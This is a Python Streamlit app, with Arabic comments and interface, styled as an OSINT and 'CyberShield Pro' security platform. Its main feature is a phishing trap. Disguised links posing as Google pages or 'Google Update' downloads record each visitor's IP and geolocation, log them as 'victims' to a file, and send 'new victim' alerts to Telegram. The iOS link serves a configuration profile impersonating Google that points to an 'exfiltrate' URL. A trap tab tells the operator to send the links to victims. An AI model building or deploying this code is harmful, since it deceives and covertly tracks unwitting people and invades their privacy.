import streamlit as st
import requests
import json
import os
from datetime import datetime
import config
import base64
import uuid
import socket
import dns.resolver
import subprocess
import platform

# استيراد مساعد الهجوم الذكي
try:
    from ai_hacking import AIHackingAssistant
except ImportError:
    pass

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide", initial_sidebar_state="expanded")

# إخفاء واجهة Streamlit تماماً في وضع التمويه
hide_st_style = """
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            header {visibility: hidden;}
            .stApp [data-testid="stToolbar"] {display: none;}
            .stApp [data-testid="stDecoration"] {display: none;}
            .stApp [data-testid="stStatusWidget"] {display: none;}
            #manage-app-button {display: none !important;}
            [data-testid="stStatusWidget"] {display: none !important;}
            .st-emotion-cache-10trblm {display: none !important;}
            .st-emotion-cache-1dp5vir {display: none !important;}
            </style>
            """

# دالة جلب الـ IP العام من السيرفر (X-Forwarded-For)
def get_server_side_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            return headers["X-Forwarded-For"].split(",")[0].strip()
        return "Unknown"
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        return
        
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass

    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📍 عنوان IP: {ip}
🌍 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏢 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
    except:
        pass

# دالة تسجيل الضحايا
def log_victim(ip, country, city, isp, device, trap_name):
    victims_file = "victims.json"
    victim_data = {
        "ip": ip,
        "country": country,
        "city": city,
        "isp": isp,
        "device": device,
        "trap_name": trap_name,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        if os.path.exists(victims_file):
            with open(victims_file, "r") as f:
                data = json.load(f)
        else:
            data = []
        data.append(victim_data)
        with open(victims_file, "w") as f:
            json.dump(data, f, indent=4)
    except:
        pass

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    client_ip = query_params.get("ip", get_server_side_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    device = query_params.get("device", "Unknown")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name, device)
        
        # تسجيل الضحية
        geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
        try:
            res = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=5).json()
            if res.get("status") == "success":
                geo_data = {
                    "country": res.get("country", "Unknown"),
                    "city": res.get("city", "Unknown"),
                    "isp": res.get("isp", "Unknown")
                }
        except:
            pass
        
        log_victim(client_ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, trap_name)
        st.session_state.alert_sent = True

    # عرض صفحة تمويهية بسيطة
    st.markdown("<h1 style='text-align: center; margin-top: 40vh;'>جاري التحديث...</h1>", unsafe_allow_html=True)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_server_side_ip())
    
    send_telegram_alert(ip, f"Download ({device})", device)
    
    # تسجيل الضحية
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass
    
    log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content for Google Update"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        content = b"print('Google Update Service Started...')"
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
    st.stop()

# --- الواجهة الرئيسية للمطور ---
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.title("🛡️ تسجيل الدخول - Rashd_Ai")
    with st.form("login_form"):
        user = st.text_input("اسم المستخدم")
        pw = st.text_input("كلمة المرور", type="password")
        if st.form_submit_button("دخول"):
            if user == "Rashd919" and pw == "112233":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("بيانات خاطئة")
    st.stop()

st.title("🛡 منصة CyberShield Pro للذكاء الاستخباراتي و OSINT")

with st.sidebar:
    st.header("⚙️ الإعدادات")
    groq_api_key = st.text_input("GROQ API Key", value=config.get_key("GROQ_API_KEY") or "", type="password", key="sidebar_groq")
    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", type="password", key="sidebar_telegram_token")
    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="sidebar_telegram_chat_id")
    
    if st.button("حفظ الإعدادات", key="save_settings_btn"):
        config.set_key("GROQ_API_KEY", groq_api_key)
        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
        st.success("تم الحفظ بنجاح!")
    
    if st.button("تسجيل الخروج", key="logout_btn"):
        st.session_state.authenticated = False
        st.rerun()

# التبويبات الـ 18 المطلوبة
tab_names = [
    "💬 المحادثة", "🌐 تحليل الدومين", "🔍 فحص المواقع", "👤 بحث عن المستخدم", "📍 تحديد الموقع", 
    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 Google Dork", 
    "📧 Email OSINT", "📱 Phone Lookup", "🌑 Dark Web", "🔌 Port Scanner", 
    "⚠️ Vulnerability Scanner", "🗺 Network Mapper", "🤖 AI Threat Analysis", "💡 AI Pentest Advisor", "📄 التقارير",
    "🎯 المصيدة"
]
tabs = st.tabs(tab_names)

# 0. المحادثة
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    if "messages" not in st.session_state:
        st.session_state.messages = []
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except Exception as e:
                response = f"أنا مساعدك الذكي Rashd_Ai. حدث خطأ: {str(e)}"
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

# 1. تحليل الدومين
with tabs[1]:
    st.header("🌐 تحليل الدومين")
    domain = st.text_input("أدخل اسم الدومين", key="domain_input")
    if st.button("تحليل الدومين", key="domain_btn_1"):
        st.info("جاري التحليل...")
        try:
            response = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=5)
            st.json(response.json())
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 2. فحص المواقع
with tabs[2]:
    st.header("🔍 فحص المواقع")
    url = st.text_input("أدخل رابط الموقع", key="site_input")
    if st.button("فحص الموقع", key="site_btn_2"):
        st.info("جاري الفحص...")
        try:
            response = requests.get(url, timeout=5)
            st.write(f"Status Code: {response.status_code}")
            st.json(dict(response.headers))
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 3. بحث عن المستخدم
with tabs[3]:
    st.header("👤 بحث عن المستخدم")
    username = st.text_input("أدخل اسم المستخدم", key="username_input")
    if st.button("بحث عن المستخدم", key="username_btn_3"):
        st.info("جاري البحث...")
        st.write("هذه الميزة قيد التطوير.")

# 4. تحديد الموقع
with tabs[4]:
    st.header("📍 تحديد الموقع الجغرافي")
    ip = st.text_input("أدخل عنوان IP", key="geo_input")
    if st.button("تحديد الموقع", key="geo_btn_4"):
        st.info("جاري التحديد...")
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            st.json(response.json())
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 5. سطح الهجوم
with tabs[5]:
    st.header("🏗️ سطح الهجوم")
    target = st.text_input("أدخل الهدف", key="attack_surface_input")
    if st.button("تحليل سطح الهجوم", key="attack_surface_btn_5"):
        st.info("جاري التحليل...")
        st.write("هذه الميزة قيد التطوير.")

# 6. تحليل ذكي
with tabs[6]:
    st.header("🧠 تحليل ذكي")
    target = st.text_input("أدخل الهدف للتحليل الذكي", key="ai_analysis_input")
    if st.button("تحليل", key="ai_analysis_btn_6"):
        st.info("جاري التحليل...")
        st.write("هذه الميزة قيد التطوير.")

# 7. مساعد الهجوم
with tabs[7]:
    st.header("🤖 مساعد الهجوم الذكي")
    question = st.text_input("اسأل مساعد الهجوم", key="attack_advisor_input")
    if st.button("اسأل", key="attack_advisor_btn_7"):
        st.info("جاري البحث عن الإجابة...")
        try:
            assistant = AIHackingAssistant()
            response = assistant.chat(question)
            st.markdown(response)
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 8. Google Dork
with tabs[8]:
    st.header("🔎 Google Dork")
    dork_query = st.text_input("أدخل استعلام Google Dork", key="dork_input")
    if st.button("بحث", key="dork_btn_8"):
        st.info("جاري البحث...")
        st.write("هذه الميزة قيد التطوير.")

# 9. Email OSINT
with tabs[9]:
    st.header("📧 Email OSINT")
    email = st.text_input("أدخل البريد الإلكتروني", key="email_input")
    if st.button("بحث", key="email_btn_9"):
        st.info("جاري البحث...")
        st.write("هذه الميزة قيد التطوير.")

# 10. Phone Lookup
with tabs[10]:
    st.header("📱 Phone Lookup")
    phone = st.text_input("أدخل رقم الهاتف", key="phone_input")
    if st.button("بحث", key="phone_btn_10"):
        st.info("جاري البحث...")
        st.write("هذه الميزة قيد التطوير.")

# 11. Dark Web
with tabs[11]:
    st.header("🌑 Dark Web Search")
    query = st.text_input("أدخل استعلام البحث", key="darkweb_input")
    if st.button("بحث", key="darkweb_btn_11"):
        st.info("جاري البحث...")
        st.write("هذه الميزة قيد التطوير.")

# 12. Port Scanner
with tabs[12]:
    st.header("🔌 Port Scanner")
    target = st.text_input("أدخل عنوان IP أو النطاق", key="port_scanner_input")
    if st.button("فحص", key="port_scanner_btn_12"):
        st.info("جاري الفحص...")
        try:
            open_ports = []
            for port in [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            st.success(f"المنافذ المفتوحة: {open_ports if open_ports else 'لا توجد منافذ مفتوحة'}")
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 13. Vulnerability Scanner
with tabs[13]:
    st.header("⚠️ Vulnerability Scanner")
    url = st.text_input("أدخل عنوان URL", key="vuln_scanner_input")
    if st.button("فحص", key="vuln_scanner_btn_13"):
        st.info("جاري الفحص...")
        try:
            response = requests.get(url, timeout=5)
            st.write(f"Status Code: {response.status_code}")
            st.json(dict(response.headers))
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 14. Network Mapper
with tabs[14]:
    st.header("🗺 Network Mapper")
    network = st.text_input("أدخل نطاق الشبكة", key="network_mapper_input")
    if st.button("رسم الخريطة", key="network_mapper_btn_14"):
        st.info("جاري رسم الخريطة...")
        st.write("هذه الميزة قيد التطوير.")

# 15. AI Threat Analysis
with tabs[15]:
    st.header("🤖 AI Threat Analysis")
    threat_data = st.text_area("أدخل بيانات التهديد", key="threat_analysis_input")
    if st.button("تحليل", key="threat_analysis_btn_15"):
        st.info("جاري التحليل...")
        try:
            assistant = AIHackingAssistant()
            response = assistant.chat(f"حلل هذا التهديد: {threat_data}")
            st.markdown(response)
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 16. AI Pentest Advisor
with tabs[16]:
    st.header("💡 AI Pentest Advisor")
    pentest_question = st.text_input("اسأل مستشار الاختبار الذكي", key="pentest_advisor_input")
    if st.button("اسأل", key="pentest_advisor_btn_16"):
        st.info("جاري البحث...")
        try:
            assistant = AIHackingAssistant()
            response = assistant.chat(pentest_question)
            st.markdown(response)
        except Exception as e:
            st.error(f"خطأ: {str(e)}")

# 17. التقارير
with tabs[17]:
    st.header("📄 التقارير")
    st.subheader("آخر الضحايا المكتشفين")
    try:
        if os.path.exists("victims.json"):
            with open("victims.json", "r") as f:
                victims = json.load(f)
                if victims:
                    st.dataframe(victims[::-1])
                else:
                    st.info("لا يوجد ضحايا مسجلين بعد.")
        else:
            st.info("لا يوجد ضحايا مسجلين بعد.")
    except Exception as e:
        st.error(f"خطأ: {str(e)}")

# 18. المصيدة
with tabs[18]:
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
    
    decoy_type = st.selectbox("اختر نوع المصيدة:", ["Google Decoy", "Download (ios)", "Download (android)"], key="decoy_type_select")
    
    app_ip = get_server_side_ip()
    st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")
    
    if decoy_type == "Google Decoy":
        decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("انسخ هذا الرابط وأرسله للضحية.")
    elif decoy_type == "Download (ios)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
    elif decoy_type == "Download (android)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("انسخ هذا الرابط وأرسله للضحية لتحميل APK.")

# Footer
st.markdown("<div style='text-align: center; padding: 20px; color: #888;'><p>Rashd_Ai Pro © 2026</p></div>", unsafe_allow_html=True)
